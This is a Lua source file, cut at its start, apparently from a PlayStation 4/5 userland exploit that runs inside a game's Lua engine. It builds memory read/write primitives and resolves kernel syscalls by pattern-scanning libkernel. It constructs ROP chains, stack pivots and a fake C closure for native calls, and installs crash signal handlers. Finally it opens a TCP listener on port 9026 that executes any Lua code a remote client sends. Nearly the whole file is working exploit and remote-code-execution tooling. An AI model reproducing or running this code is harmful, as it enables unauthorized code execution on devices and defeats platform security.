    if PLATFORM == "ps4" then  -- ps4 requires valid syscall wrapper, which we can scrape from libkernel .text
        local libkernel_text = memory.read_buffer(libkernel_base, 0x40000)
        -- mov rax, <num>; mov r10, rcx; syscall
        local matches = find_pattern(libkernel_text, "48 c7 c0 ? ? ? ? 49 89 ca 0f 05")
        syscall.syscall_wrapper = {}
        for i,offset in ipairs(matches) do
            local num = uint64.unpack(libkernel_text:sub(offset+3, offset+6))
            syscall.syscall_wrapper[num:tonumber()] = libkernel_base + offset - 1
        end
    elseif PLATFORM == "ps5" then -- can be any syscall wrapper in libkernel
        local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
        syscall.syscall_address = gettimeofday + 7  -- +7 is to skip "mov rax, <num>" instruction
    else
        errorf("invalid platform %s", PLATFORM)
    end

    syscall.do_sanity_check()
end

function syscall.resolve(list)
    for name, num in pairs(list) do
        if not syscall[name] then
            if PLATFORM == "ps4" then
                if syscall.syscall_wrapper[num] then
                    syscall[name] = fcall(syscall.syscall_wrapper[num], num)
                else
                    printf("warning: syscall %s (%d) not found", name, num)
                end
            elseif PLATFORM == "ps5" then
                syscall[name] = fcall(syscall.syscall_address, num)
            end
        end
    end
end

function syscall.do_sanity_check()

    syscall.resolve({
        getpid = 20,
    })

    local pid = syscall.getpid()
    if not (pid and pid.h == 0 and pid.l ~= 0) then
        error("syscall test failed")
    end
end




function syscall_mmap(addr, size)

    syscall.resolve({
        mmap = 477,
    })

    local MAP_PRIVATE = 0x2
    local MAP_FIXED = 0x10
    local MAP_ANONYMOUS = 0x1000
    local MAP_COMBINED = bit32.bor(MAP_PRIVATE, MAP_FIXED, MAP_ANONYMOUS)

    local PROT_READ = 0x1
    local PROT_WRITE = 0x2
    local PROT_COMBINED = bit32.bor(PROT_READ, PROT_WRITE)

    local ret = syscall.mmap(addr, size, PROT_COMBINED, MAP_COMBINED, -1 ,0)
    if ret:tonumber() < 0 then
        error("mmap() error: " .. get_error_string())
    end

    return ret
end





function run_lua_code(lua_code, client_fd)

    local script, err = loadstring(lua_code)
    if err then
        local err_msg = "error loading script: " .. err
        syscall.write(client_fd, err_msg, #err_msg)
        return
    end

    local env = {
        print = function(...)
            local out = prepare_arguments(...) .. "\n"
            syscall.write(client_fd, out, #out)
        end,
        printf = function(fmt, ...)
            local out = string.format(fmt, ...) .. "\n"
            syscall.write(client_fd, out, #out)
        end
    }

    setmetatable(env, { __index = _G })
    setfenv(script, env)

    err = run_with_coroutine(script)

    -- pass error to client
    if err then
        syscall.write(client_fd, err, #err)
    end
end

function get_error_string()
    local strerror = fcall(libc_addrofs.strerror)
    local error_func = fcall(libc_addrofs.error)
    local errno = memory.read_qword(error_func())
    return errno:tonumber() .. " " .. memory.read_null_terminated_string(strerror(errno))
end

function remote_lua_loader(port)

    assert(port)

    AF_INET = 2
    SOCK_STREAM = 1
    INADDR_ANY = 0

    SOL_SOCKET = 0xffff  -- options for socket level
    SO_REUSEADDR = 4  -- allow local address reuse

    local enable = memory.alloc(4)
    local sockaddr_in = memory.alloc(16)
    local addrlen = memory.alloc(8)
    local tmp = memory.alloc(8)

    local maxsize = 500 * 1024  -- 500kb
    local buf = memory.alloc(maxsize)

    local sock_fd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
    if sock_fd < 0 then
        error("socket() error: " .. get_error_string())
    end

    memory.write_dword(enable, 1)
    if syscall.setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4):tonumber() < 0 then
        error("setsockopt() error: " .. get_error_string())
    end

    local htons = function(x)
        local high = math.floor(x / 256) % 256
        local low = x % 256
        return low * 256 + high
    end

    memory.write_byte(sockaddr_in + 1, AF_INET)
    memory.write_word(sockaddr_in + 2, htons(port))
    memory.write_dword(sockaddr_in + 4, INADDR_ANY)

    if syscall.bind(sock_fd, sockaddr_in, 16):tonumber() < 0 then
        error("bind() error: " .. get_error_string())
    end
 
    if syscall.listen(sock_fd, 3):tonumber() < 0 then
        error("listen() error: " .. get_error_string())
    end

    notify(string.format("remote lua loader\nrunning on %s %s\nlistening on port %d",
        PLATFORM, FW_VERSION, port))
    
    -- setup signal handler
    if options.enable_signal_handler then
        signal.init()
        print("[+] signal handler registered")
    end

    while true do

        print("[+] waiting for new connection...")
        
        memory.write_dword(addrlen, 16)
        local client_fd = syscall.accept(sock_fd, sockaddr_in, addrlen):tonumber()  
        if client_fd < 0 then
            error("accept() error: " .. get_error_string())
        end
 
        syscall.read(client_fd, tmp, 8)
        local size = memory.read_qword(tmp):tonumber()
        
        printf("[+] accepted new connection client fd %d", client_fd)

        if size > 0 and size < maxsize then
            
            local cur_size = size
            local cur_buf = buf
            
            while cur_size > 0 do
                local read_size = syscall.read(client_fd, cur_buf, cur_size):tonumber()
                if read_size < 0 then
                    error("read() error: " .. get_error_string())
                end
                cur_buf = cur_buf + read_size
                cur_size = cur_size - read_size
            end
            
            local lua_code = memory.read_buffer(buf, size)

            printf("[+] accepted lua code with size %d (%s)", #lua_code, hex(#lua_code))
            
            if options.enable_signal_handler then
                signal.set_sink_fd(client_fd)
            end

            run_lua_code(lua_code, client_fd)
        else
            local err = string.format("error: lua code exceed maxsize " ..
                "(given %s maxsize %s)\n", hex(size), hex(maxsize))
            syscall.write(client_fd, err, #err)
        end

        syscall.close(client_fd)
    end

    syscall.close(sock_fd)
end

function get_module_name(addr)
    local sceKernelGetModuleInfoFromAddr = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
    local buf = memory.alloc(0x100)
    if sceKernelGetModuleInfoFromAddr(addr, 1, buf):tonumber() ~= 0 then
        return nil
    end
    return memory.read_null_terminated_string(buf+8)
end

function resolve_base(initial_addr, modname, max_page_search)

    local initial_page = initial_addr:band(uint64(0xfff):bnot())
    local page_size = 0x1000

    for i=0, max_page_search-1 do
        local base = initial_page - i*page_size
        local cur_modname = get_module_name(base)
        local prev_modname = get_module_name(base - page_size)
        if cur_modname == modname and prev_modname ~= modname then
            return base
        end
    end

    errorf("failed to resolve %s base", modname)
end

function sysctlbyname(name, oldp, oldp_len, newp, newp_len)
    
    local translate_name_mib = memory.alloc(0x8)
    local buf_size = 0x70
    local mib = memory.alloc(buf_size)
    local size = memory.alloc(0x8)

    memory.write_qword(translate_name_mib, 0x300000000)
    memory.write_qword(size, buf_size)
    
    if syscall.sysctl(translate_name_mib, 2, mib, size, name, #name):tonumber() < 0 then
        errorf("failed to translate sysctl name to mib (%s)", name)
    end

    if syscall.sysctl(mib, 2, oldp, oldp_len, newp, newp_len):tonumber() < 0 then
        return false
    end

    return true
end

function get_version()

    local version = nil

    local buf = memory.alloc(0x8)
    local size = memory.alloc(0x8)
    memory.write_qword(size, 0x8)

    if sysctlbyname("kern.sdk_version", buf, size, 0, 0) then
        local ver = memory.read_buffer(buf+2, 2)
        version = string.format('%x.%02x', string.byte(ver:sub(2,2)), string.byte(ver:sub(1,1)))
    end

    return version
end




native = {}

function native.get_lua_opt(chain, fn, a1, a2, a3)
    chain:push_fcall_raw(fn, function()
        chain:push_set_rdx(a3)
        chain:push_set_rsi(a2)
        chain:push_set_reg_from_memory("rdi", a1)
    end)
end

function native.gen_fcall_chain(lua_state)

    local chain = ropchain({
        start_from_base = true,
    })

    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - fn addr
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 2 - rax (for syscall)
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 3 - rdi
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 5, 0)  -- 4 - rsi
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 6, 0)  -- 5 - rdx
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 7, 0)  -- 6 - rcx
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 8, 0)  -- 7 - r8
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 9, 0)  -- 8 - r9

    local prep_arg_callback = function()
        chain:push_set_reg_from_memory("r9", chain.retval_addr[8])
        chain:push_set_reg_from_memory("r8", chain.retval_addr[7])
        chain:push_set_reg_from_memory("rcx", chain.retval_addr[6])
        chain:push_set_reg_from_memory("rdx", chain.retval_addr[5])
        chain:push_set_reg_from_memory("rsi", chain.retval_addr[4])
        chain:push_set_reg_from_memory("rdi", chain.retval_addr[3])
        chain:push_set_rax_from_memory(chain.retval_addr[2])
    end

    chain:push_fcall_raw(chain.retval_addr[1], prep_arg_callback, true)

    -- pass return value to caller
    chain:push_fcall_raw(eboot_addrofs.lua_pushinteger, function()
        chain:push_set_reg_from_memory("rsi", chain.retval_addr[9])
        chain:push_set_reg_from_memory("rdi", lua_state)
    end)

    return chain
end

function native.gen_read_buffer_chain(lua_state)

    local chain = ropchain({
        start_from_base = true,
    })

    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - addr to read
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 2 - size

    chain:push_fcall_raw(eboot_addrofs.lua_pushlstring, function()
        chain:push_set_reg_from_memory("rdx", chain.retval_addr[2])
        chain:push_set_reg_from_memory("rsi", chain.retval_addr[1])
        chain:push_set_reg_from_memory("rdi", lua_state)
    end)

    return chain
end

function native.gen_write_buffer_chain(lua_state)

    local chain = ropchain({
        start_from_base = true,
    })

    chain.string_len = memory.alloc(0x8)

    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 2, 0)  -- 1 - dest to write
    native.get_lua_opt(chain, eboot_addrofs.luaL_checklstring, lua_state, 3, chain.string_len)  -- 2 - src buffer

    chain:push_fcall_raw(libc_addrofs.memcpy, function()
        chain:push_set_reg_from_memory("rdx", chain.string_len)
        chain:push_set_reg_from_memory("rsi", chain.retval_addr[2])
        chain:push_set_reg_from_memory("rdi", chain.retval_addr[1])
    end)

    return chain
end

function native.create_dispatcher(pivot_handler)

    local jump_table = memory.alloc(0x8 * 16)
    local jmpbuf_backup = memory.alloc(0x100)
    local lua_state = memory.alloc(0x8)

    syscall_mmap(pivot_handler.pivot_base, 0x2000)

    local dispatcher = ropchain({
        stack_base = pivot_handler.pivot_addr,
        start_from_base = true,
    })

    -- backup lua state
    dispatcher:push_store_rdi_into_memory(lua_state)

    -- backup current context
    dispatcher:push_fcall(libc_addrofs.setjmp, jmpbuf_backup)

    -- todo: setting hardcoded offset like this is bad. improve this
    local stack_offset = -0x78
    if game_name == "HamidashiCreative" then
        stack_offset = -0x68
    end
    
    dispatcher:push_set_rax_from_memory(jmpbuf_backup+0x18)  -- get rbp
    dispatcher:push_add_to_rax(stack_offset)  -- calc rsp from rbp
    dispatcher:push_store_rax_into_memory(jmpbuf_backup+0x10)  -- fix rsp
    dispatcher:push(gadgets["mov rax, [rax]; ret"])  -- get ret addr from rsp
    dispatcher:push_store_rax_into_memory(jmpbuf_backup)  -- fix rip

    native.get_lua_opt(dispatcher, eboot_addrofs.luaL_optinteger, lua_state, 1, 0)

    -- pivot to appropriate handler
    dispatcher:push_set_rax_from_memory(dispatcher.retval_addr[2])
    dispatcher:dispatch_jumptable_with_rax_index(jump_table)

    return {
        dispatcher = dispatcher,
        jump_table = jump_table,
        jmpbuf_backup = jmpbuf_backup,
        lua_state = lua_state
    }

end

function native.create_native_handler(dispatcher)

    local register_handle = function(list)
        for i, handler in ipairs(list) do
            handler:restore_through_longjmp(dispatcher.jmpbuf_backup)
            memory.write_qword(dispatcher.jump_table + 8*(i-1), handler.stack_base)    
        end
    end

    local handler = {
        native.gen_read_buffer_chain(dispatcher.lua_state),
        native.gen_write_buffer_chain(dispatcher.lua_state),
        native.gen_fcall_chain(dispatcher.lua_state),
    }

    register_handle(handler)

    return handler
end

function native.init()

    local pivot_handler = gadgets.stack_pivot[2]

    native_dispatcher = native.create_dispatcher(pivot_handler)
    global_native_handler = native.create_native_handler(native_dispatcher)

    native_invoke = lua.create_fake_cclosure(pivot_handler.gadget_addr)

    syscall.do_sanity_check()
end

function native.fcall_with_rax(fn_addr, rax, rdi, rsi, rdx, rcx, r8, r9)
    assert(fn_addr)
    return uint64(native_invoke(
        native_cmd.fcall,
        uint64(fn_addr):tonumber(),
        uint64(rax or 0):tonumber(),
        ropchain.resolve_value(rdi or 0):tonumber(),
        ropchain.resolve_value(rsi or 0):tonumber(),
        ropchain.resolve_value(rdx or 0):tonumber(),
        ropchain.resolve_value(rcx or 0):tonumber(),
        ropchain.resolve_value(r8 or 0):tonumber(),
        ropchain.resolve_value(r9 or 0):tonumber()
    ))
end

function native.fcall(fn_addr, rdi, rsi, rdx, rcx, r8, r9)
    return native.fcall_with_rax(fn_addr, nil, rdi, rsi, rdx, rcx, r8, r9)
end

function native.read_buffer(addr, size)
    assert(addr and size)
    return native_invoke(
        native_cmd.read_buffer,
        ropchain.resolve_value(addr):tonumber(),
        ropchain.resolve_value(size):tonumber()
    )
end

function native.write_buffer(addr, buf)
    assert(addr and buf)
    native_invoke(
        native_cmd.write_buffer,
        ropchain.resolve_value(addr):tonumber(),
        buf
    )
end





signal = {}

function signal.setup_handler(pivot_handler)

    local mcontext_offset = 0x40
    local reg_rbp_offset = 0x48
    local reg_rsp_offset = 0xb8    
    
    local ucontext_struct_addr = memory.alloc(8)
    local output_addr = memory.alloc(0x18)
    
    signal.fd_addr = memory.alloc(8)

    syscall_mmap(pivot_handler.pivot_base, 0x2000)

    local chain = ropchain({
        stack_base = pivot_handler.pivot_addr,
        start_from_base = true,
    })

    --
    -- write error address back to socket
    --

    memory.write_qword(output_addr, 0x13371337) -- write magic value    
    chain:push_store_rdi_into_memory(output_addr + 0x8) -- rdi contains signal code
    chain:push_store_rax_into_memory(output_addr + 0x10) -- rax contains crashing address
    chain:push_store_rdx_into_memory(ucontext_struct_addr)

    -- send signal info to client
    chain:push_syscall_raw(syscall.write, function()
        chain:push_set_rdx(0x18)
        chain:push_set_rsi(output_addr)
        chain:push_set_reg_from_memory("rdi", signal.fd_addr)
    end)

    -- send mcontext buffer to client
    chain:push_syscall_raw(syscall.write, function()
        chain:push_set_rdx(0x100)
        chain:push_set_rax_from_memory(ucontext_struct_addr)
        chain:push_add_to_rax(mcontext_offset)
        chain:push_set_reg_from_rax("rsi")
        chain:push_set_reg_from_memory("rdi", signal.fd_addr)
    end)

    --
    -- gracefully restore execution
    --

    -- advance to old rbp
    chain:push_set_rax_from_memory(ucontext_struct_addr)
    chain:push_add_to_rax(mcontext_offset + reg_rbp_offset)
    
    -- write to rop chain
    chain:push_store_rax_data_and_add_into_memory(chain:get_rsp() + 0x158, 0x8) -- write value to push_set_rbp()
    
    -- advance to old rsp
    chain:push_set_rax_from_memory(ucontext_struct_addr)
    chain:push_add_to_rax(mcontext_offset + reg_rsp_offset)
    
    -- write to rop chain
    chain:push_store_rax_data_and_add_into_memory(chain:get_rsp() + 0x120, 0x8) -- write value to push_set_rsp()
    
    chain:push_set_r9(0)
    chain:push_set_r8(0)
    chain:push_set_rsi(0)
    chain:push_set_rdx(0)
    chain:push_set_rcx(0)
    chain:push_set_rbx(0)
    chain:push_set_rbp(0) -- will be changed
    chain:push_set_rdi(0)
    chain:push_set_rax(0)
    chain:push_set_rsp(0) -- will be changed
end

function signal.init()

    local pivot_handler = gadgets.stack_pivot[1]

    local SIGILL = 4
    local SIGBUS = 10
    local SIGSEGV = 11
    
    local signals = {SIGILL, SIGBUS, SIGSEGV}
    
    local SA_SIGINFO = 0x4
    local sigaction_struct = memory.alloc(0x28)
    
    memory.write_qword(sigaction_struct, pivot_handler.gadget_addr) -- sigaction.sa_handler
    memory.write_qword(sigaction_struct+0x20, SA_SIGINFO) -- sigaction.sa_flags

    for i,signal in ipairs(signals) do
        if syscall.sigaction(signal, sigaction_struct, 0):tonumber() < 0 then
            error("sigaction() error: " .. get_error_string())
        end
    end

    signal.setup_handler(pivot_handler)
end

function signal.set_sink_fd(fd)
    memory.write_qword(signal.fd_addr, fd)
end





function main()

    -- setup read & limited write primitives
    lua.setup_primitives()

    -- setup better write primitive
    memory.memcpy = fcall(libc_addrofs.memcpy)

    print("[+] usermode r/w primitives achieved")

    libkernel_base = resolve_base(
        memory.read_qword(libc_addrofs.gettimeofday_import),
        "libkernel.sprx", 5
    )

    print("[+] libkernel base @ " .. hex(libkernel_base))

    syscall.init()  -- enable syscall

    if options.enable_native_handler then
        native.init()
        print("[+] native handler registered")
    end

    -- resolve required syscalls for remote lua loader 
    syscall.resolve({
        read = 3,
        write = 4,
        open = 5,
        close = 6,
        accept = 30,
        socket = 97,
        bind = 104,
        setsockopt = 105,
        listen = 106,
        sysctl = 202,
        sigaction = 416,
    })

    print("[+] syscall initialized")

    FW_VERSION = get_version()

    -- stable but exhaust memory
    run_nogc(function()
        local port = 9026
        remote_lua_loader(port)
    end)

    -- -- less stable but doesnt exhaust memory
    -- local port = 9026
    -- remote_lua_loader(port)

    notify("finished")

    sleep(10000000)
end

function entry()
    local err = run_with_coroutine(main)
    if err then
        notify(err)
        print(err)
    end
end

entry()